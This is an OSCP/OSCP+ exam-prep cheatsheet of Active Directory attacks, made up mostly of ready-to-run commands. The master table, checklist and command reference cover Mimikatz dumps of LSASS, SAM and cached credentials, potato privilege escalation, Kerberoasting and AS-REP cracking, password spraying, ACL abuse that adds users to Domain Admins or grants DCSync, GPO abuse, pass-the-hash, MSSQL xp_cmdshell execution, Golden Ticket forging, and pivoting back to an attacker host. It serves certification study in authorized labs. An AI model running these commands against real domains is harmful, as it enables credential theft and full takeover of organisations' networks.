# OSCP / OSCP+ Active Directory Only Master Cheatsheet

> **Scope**: Active Directory attacks only. Windows and Linux local privilege escalation are covered in separate cheatsheets.
>
> **AD set format**: 3 machines, 10 + 10 + 20 = 40 points. Assumed-breach credentials provided at start.
>
> **Explicitly excluded**: ADCS (ESC1–ESC10), certificate template abuse. Not in official PEN-200 outline.

---

## Master Table

| # | Technique | How to Identify | Output Validation | Exploitation Approach | Tool Commands | Priority |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | **Assumed Breach (WinRM/RDP/SMB)** | Provided domain credentials | `nxc winrm` = `Pwn3d!` ; `evil-winrm` connects ; `xfreerdp` prompts desktop | Establish foothold on first AD machine (usually dual-homed) | `nxc winrm <IP> -u <user> -p <pass>` ; `evil-winrm -i <IP> -u <user> -p '<pass>'` ; `xfreerdp /u:<user> /p:<pass> /v:<IP>` | **High** |
| 2 | **SeImpersonate on AD Host** | `whoami /priv` on foothold | `SeImpersonatePrivilege` = **Enabled** | PrintSpoofer/GodPotato → SYSTEM on AD host | `.\PrintSpoofer64.exe -i -c "powershell -ep bypass"` ; `.\GodPotato.exe -cmd "cmd /c whoami"` | **High** |
| 3 | **Mimikatz LSASS** | SYSTEM on AD host | `sekurlsa::logonpasswords` returns NTLM/plaintext for logged-on domain users | Harvest domain user creds → PtH | `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` | **High** |
| 4 | **Mimikatz SAM** | SYSTEM on AD host | `lsadump::sam` returns local Administrator hash | Harvest local admin hash → local admin on other hosts | `.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` | **High** |
| 5 | **Mimikatz Cached Domain Creds** | SYSTEM on AD host | `lsadump::cache` returns mscash2 hashes | Crack offline (hashcat 2100) → plaintext domain creds | `.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` → `hashcat -m 2100 hash.txt rockyou.txt` | **High** |
| 6 | **C:\windows.old (SAM/SYSTEM)** | Check `C:\windows.old\Windows\System32\config\SAM` | Files exist and readable | Dump old SAM/SYSTEM → local hashes not rotated | `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` | Medium |
| 7 | **PowerShell History on AD Host** | `type $env:APPDATA\...\ConsoleHost_history.txt` | Plaintext passwords / `runas /savecred` commands | Reuse creds for lateral movement | `type ConsoleHost_history.txt` | **High** |
| 8 | **BloodHound / SharpHound** | Run on compromised host | Graph shows ACL edges, local admin, sessions, Kerberoastable, AS-REP, shortest path to DA | Analyze for: **GenericAll**, **WriteDACL**, **ForceChangePassword**, **AddMember**, **DCSync**, local admin | `Invoke-BloodHound -CollectionMethod All` → import ZIP to BloodHound | **High** |
| 9 | **PowerView Manual Enum** | `Get-DomainUser -SPN` ; `Get-DomainUser -PreauthNotRequired` ; `Find-InterestingDomainAcl -ResolveGUIDs` ; `Get-DomainTrust` ; `Find-LocalAdminAccess` | SPN users, pre-auth-not-required users, exploitable ACLs, trusts, local admin access | Identify paths not caught by BloodHound | `Get-DomainUser -SPN` ; `Find-InterestingDomainAcl -ResolveGUIDs` ; `Find-LocalAdminAccess` | **High** |
| 10 | **NetExec Enumeration** | `nxc smb --users --shares --pass-pol` | `--users` builds userlist; `--shares` finds readable shares; `--pass-pol` shows lockout threshold | Build target lists, validate creds, find share creds | `nxc smb <DC> -u <user> -p <pass> --users` ; `nxc smb <IP> -u <user> -p <pass> --shares` ; `nxc smb <IP> -u <user> -p <pass> --pass-pol` | **High** |
| 11 | **AS-REP Roasting** | `Get-DomainUser -PreauthNotRequired` ; `nxc ldap --asreproast` | Hashcat **18200** cracks AS-REP hash | Request AS-REP → crack offline | `impacket-GetNPUsers <domain>/ -dc-ip <DC> -no-pass -usersfile users.txt -request` → `hashcat -m 18200 hash.txt rockyou.txt` | **High** |
| 12 | **Kerberoasting** | `Get-DomainUser -SPN` ; `nxc ldap --kerberoast` | Hashcat **13100** cracks TGS-REP hash | Request TGS → crack offline → service account password | `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request` → `hashcat -m 13100 hash.txt rockyou.txt -r best64.rule` | **High** |
| 13 | **Password Spraying** | `nxc smb --pass-pol` shows lockout threshold | `[+]` valid creds across hosts; `Pwn3d!` for admin | Spray single password across userlist (respect lockout) | `nxc smb <IP_range> -u users.txt -p 'Welcome1' --continue-on-success` | **High** |
| 14 | **ACL: GenericAll on User** | BloodHound `GenericAll` edge to target user | Edge confirmed | Reset password → authenticate as target. Or set SPN → Kerberoast | `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)` | **High** |
| 15 | **ACL: GenericAll / WriteDACL on Group** | BloodHound `GenericAll`/`WriteDACL` on `Domain Admins`/`Account Operators` | Edge confirmed | Add self to group → re-login → DA | `Add-DomainGroupMember -Identity 'Domain Admins' -Members <user>` ; `Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync` | **High** |
| 16 | **ACL: ForceChangePassword** | BloodHound `ForceChangePassword` edge | Edge confirmed | Reset target password → authenticate as target | `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)` | **High** |
| 17 | **ACL: WriteDACL → DCSync** | BloodHound `WriteDACL` on domain object | Edge confirmed | Grant self DCSync → dump hashes | `Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync` → `impacket-secretsdump <domain>/<user>:<pass>@<DC> -just-dc-ntlm` | **High** |
| 18 | **ACL: AddMember (Group)** | BloodHound `AddMember` edge to privileged group | Edge confirmed | Add self/controlled user to group | `Add-DomainGroupMember -Identity '<Group>' -Members <user>` | **High** |
| 19 | **ACL: GPO Abuse** | BloodHound `GenericWrite` on GPO linked to privileged OU | Edge confirmed | Push local admin / scheduled task via GPO | `SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c net localgroup administrators <user> /add" --GPOName "<GPO>"` | Medium |
| 20 | **GPP Passwords (cpassword)** | `Get-GPPPassword` in PowerView | `Groups.xml` in SYSVOL with `cpassword` | Decrypt AES key → local admin password | `Get-GPPPassword` | **High** |
| 21 | **Pass-the-Hash** | NTLM hash from Mimikatz/secretsdump | `nxc smb -H <hash>` = `Pwn3d!` | Impacket PtH / evil-winrm PtH | `impacket-psexec <domain>/<user>@<IP> -hashes :<NTLM>` ; `evil-winrm -i <IP> -u <user> -H <NTLM>` | **High** |
| 22 | **WinRM / RDP with Creds** | Plaintext creds from cracking/spraying | `nxc winrm` = `Pwn3d!` ; `evil-winrm` connects ; `xfreerdp` prompts | Interactive shell/desktop on target hosts | `evil-winrm -i <IP> -u <user> -p '<pass>'` ; `xfreerdp /u:<user> /p:<pass> /v:<IP>` | **High** |
| 23 | **MSSQL Impersonation + xp_cmdshell** | Compromised `sql_svc` or MSSQL login; `nxc mssql -M enum_impersonate` | `enum_impersonate` shows `sa` impersonation ability | `EXECUTE AS LOGIN='sa'` → enable `xp_cmdshell` → OS commands | `impacket-mssqlclient <domain>/<user>@<IP> -windows-auth` → `EXECUTE AS LOGIN='sa';` → `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` → `EXEC xp_cmdshell 'whoami'` | **High** |
| 24 | **SMB Shares (Credential Hunting)** | `nxc smb --shares` | Readable shares contain scripts/configs/`passwords.txt` | Mount share → search creds → reuse for lateral movement | `smbclient //<IP>/<share> -U <user>%<pass>` | **High** |
| 25 | **DCSync** | DA or `DS-Replication-Get-Changes` rights; BloodHound DCSync edge | `secretsdump -just-dc-ntlm` returns all hashes incl. `krbtgt` | Simulate DC replication → dump all domain hashes | `impacket-secretsdump <domain>/<user>:<pass>@<DC> -just-dc-ntlm` | **High** |
| 26 | **Golden Ticket** | Have `krbtgt` NTLM hash | `kerberos::golden` creates TGT ; `klist` confirms | Forge TGT for fake DA → inject → access any resource | `mimikatz "kerberos::golden /sid:<SID> /domain:<domain> /ptt /rc4:<krbtgt_hash> /user:fakeadmin"` → `klist` | Medium |
| 27 | **Pivoting (Ligolo-ng / Chisel)** | `ipconfig` on first AD host shows second NIC in internal subnet ; `netstat` shows internal services | Internal subnet reachable only through dual-homed host | Tunnel Kali → internal subnet → MS02/DC01 | **Ligolo**: `linux_amd64-proxy -selfcert -laddr 0.0.0.0:443` → on MS01: `agent.exe -connect <KALI_IP>:443 -ignore-cert` → `sudo ip route add 10.10.118.0/24 dev ligolo` | **High** |

---

## Output Validation Summary

- **`nxc winrm`**: `Pwn3d!` = user in Remote Management Users → `evil-winrm` eligible.
- **`whoami /priv`**: `SeImpersonatePrivilege` = Enabled → PrintSpoofer/GodPotato → SYSTEM.
- **Mimikatz `sekurlsa::logonpasswords`**: NTLM/plaintext for logged-on users.
- **Mimikatz `lsadump::cache`**: mscash2 hashes for offline cracking (hashcat 2100).
- **BloodHound**: Shortest path to DA; look for **GenericAll**, **WriteDACL**, **ForceChangePassword**, **AddMember**, **DCSync** edges.
- **`Get-DomainUser -SPN`**: Kerberoastable accounts.
- **`Get-DomainUser -PreauthNotRequired`**: AS-REP roastable accounts.
- **`Find-InterestingDomainAcl`**: Exploitable ACLs not caught by BloodHound.
- **`nxc smb --pass-pol`**: Lockout threshold → safe spraying.
- **`nxc smb --shares`**: Readable shares may contain `passwords.txt` or configs.
- **`C:\windows.old`**: Historical SAM/SYSTEM → local hashes not rotated.
- **`ipconfig` dual-homed**: Second NIC reveals internal subnet for pivoting.

---

## AD Attack Chain Checklist

1. **Can I access the first host with provided creds?** → `nxc winrm/smb/rdp`
2. **Do I have SeImpersonatePrivilege?** → `whoami /priv` → PrintSpoofer/GodPotato → SYSTEM
3. **What creds can I harvest locally?** → Mimikatz (LSASS + SAM + **cache**), PS history, `C:\windows.old`
4. **What does BloodHound show?** → SharpHound → import → shortest path to DA → **note ACL edges**
5. **Are there Kerberoastable / AS-REP users?** → `GetUserSPNs` / `GetNPUsers` → crack offline
6. **Can I spray the userlist?** → `nxc smb --pass-pol` → spray with `--continue-on-success`
7. **Can I abuse ACLs?** → GenericAll / WriteDACL / ForceChangePassword / AddMember → execute
8. **Can I pivot?** → `ipconfig` dual-homed → Ligolo → internal subnet
9. **Can I MSSQL?** → `enum_impersonate` → `EXECUTE AS sa` → `xp_cmdshell`
10. **Can I DCSync?** → DA or WriteDACL→DCSync → `secretsdump -just-dc-ntlm` → `krbtgt` → Golden Ticket

---

## Quick Command Reference

| Purpose | Command |
| :--- | :--- |
| WinRM access | `evil-winrm -i <IP> -u <user> -p '<pass>'` / `evil-winrm -i <IP> -u <user> -H <hash>` |
| SMB sweep | `nxc smb <IP> -u <user> -p <pass> --shares --users --pass-pol --continue-on-success` |
| WinRM spray | `nxc winrm <IP> -u users.txt -p passwords.txt --continue-on-success` |
| Local priv check | `whoami /priv` |
| PrintSpoofer | `.\PrintSpoofer64.exe -i -c "powershell -ep bypass"` |
| GodPotato | `.\GodPotato.exe -cmd "cmd /c whoami"` |
| Mimikatz LSASS | `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` |
| Mimikatz SAM | `.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` |
| Mimikatz cache | `.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` |
| BloodHound collect | `Invoke-BloodHound -CollectionMethod All` |
| PowerView SPN | `Get-DomainUser -SPN` |
| PowerView pre-auth | `Get-DomainUser -PreauthNotRequired` |
| PowerView ACLs | `Find-InterestingDomainAcl -ResolveGUIDs` |
| AS-REP Roast | `impacket-GetNPUsers <domain>/ -dc-ip <DC> -no-pass -usersfile users.txt -request` |
| Kerberoast | `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request` |
| Crack AS-REP | `hashcat -m 18200 hash.txt rockyou.txt` |
| Crack Kerberoast | `hashcat -m 13100 hash.txt rockyou.txt -r best64.rule` |
| Crack cached creds | `hashcat -m 2100 hash.txt rockyou.txt` |
| Add to group | `Add-DomainGroupMember -Identity 'Domain Admins' -Members <user>` |
| Reset password | `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)` |
| Grant DCSync | `Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync` |
| GPP passwords | `Get-GPPPassword` |
| Pass-the-Hash (psexec) | `impacket-psexec <domain>/<user>@<IP> -hashes :<NTLM>` |
| Pass-the-Hash (winrm) | `evil-winrm -i <IP> -u <user> -H <NTLM>` |
| MSSQL impersonation check | `nxc mssql <IP> -u <user> -p <pass> -M enum_impersonate --local-auth` |
| MSSQL impersonate + xp_cmdshell | `EXECUTE AS LOGIN='sa'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';` |
| DCSync | `impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc-ntlm` |
| Golden Ticket | `mimikatz "kerberos::golden /sid:<SID> /domain:<domain> /ptt /rc4:<krbtgt_hash> /user:fakeadmin"` |
| Ligolo proxy | `linux_amd64-proxy -selfcert -laddr 0.0.0.0:443` |
| Ligolo agent | `agent.exe -connect <KALI_IP>:443 -ignore-cert` |
| Ligolo route | `sudo ip route add <internal_subnet> dev ligolo` |

---

## Exam Rules (AD-Specific)

- **AD set weight**: 40 points (Machine 1: 10 + Machine 2: 10 + Machine 3/DC: 20).
- **Pivoting**: May be required. Anything in PEN-200 is examinable.
- **Metasploit**: Only **one** target machine. Cannot be used for pivoting.
- **Allowed tools**: BloodHound (Legacy/Community), SharpHound, PowerView, Rubeus, evil-winrm, NetExec/CrackMapExec, Mimikatz, Impacket, PrintSpoofer, Ligolo-ng, Chisel.
- **PSSession**: PowerShell Core counts as interactive shell — allowed.
- **Scoring change (Dec 2026+)**: OSCP+ moves to equated scaled scoring (400/500). **Do not stop at 70 raw points** — attempt every machine and submit every flag.
- **ADCS**: Not in official PEN-200 outline. **Do not prepare.**

---

## GitHub Usage Tips

1. Save as `OSCP-Active-Directory-Only-Cheatsheet.md`
2. Keep `\|` escapes in Markdown tables
3. Branch per AD practice target (e.g., `git checkout -b htb-forest`)
4. Do **not** add ADCS/ESC1–ESC10 rows — explicitly out of scope
